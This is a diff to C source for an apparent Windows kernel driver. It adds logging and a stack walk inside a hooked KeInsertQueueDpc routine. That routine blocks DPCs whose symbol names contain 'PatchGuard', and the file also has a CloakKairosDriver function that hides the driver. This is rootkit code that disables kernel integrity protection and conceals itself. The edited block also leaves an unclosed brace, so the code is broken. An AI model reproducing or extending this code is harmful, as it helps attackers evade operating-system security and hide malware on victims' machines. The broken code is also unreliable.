@@ -357,6 +357,9 @@ VOID HookKeInsertQueueDpc() {
 
 BOOLEAN HookedKeInsertQueueDpc(PKDPC Dpc, PVOID Arg1, PVOID Arg2, PVOID Arg3) {
     if (Dpc && MmIsAddressValid(Dpc->DeferredRoutine)) {
+        if (Dpc && Dpc->DeferredRoutine) {
+          DebugLog("New DPC queued: %p\n", Dpc->DeferredRoutine);
+          WalkStackTrace();  // Identify who queued the DPC
         const CHAR* name = GetSymbolNameFromAddress(Dpc->DeferredRoutine);
         if (name && strstr(name, "PatchGuard")) {
             DebugLog("Blocked PG DPC queueing: %p\n", Dpc->DeferredRoutine);
@@ -511,10 +514,7 @@ VOID WalkStackTrace(VOID) {
     }
 }
 
-if (Dpc && Dpc->DeferredRoutine) {
-    DebugLog("New DPC queued: %p\n", Dpc->DeferredRoutine);
-    WalkStackTrace();  // Identify who queued the DPC
-}
+
 
 VOID CloakKairosDriver(PDRIVER_OBJECT DriverObject) {
     PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
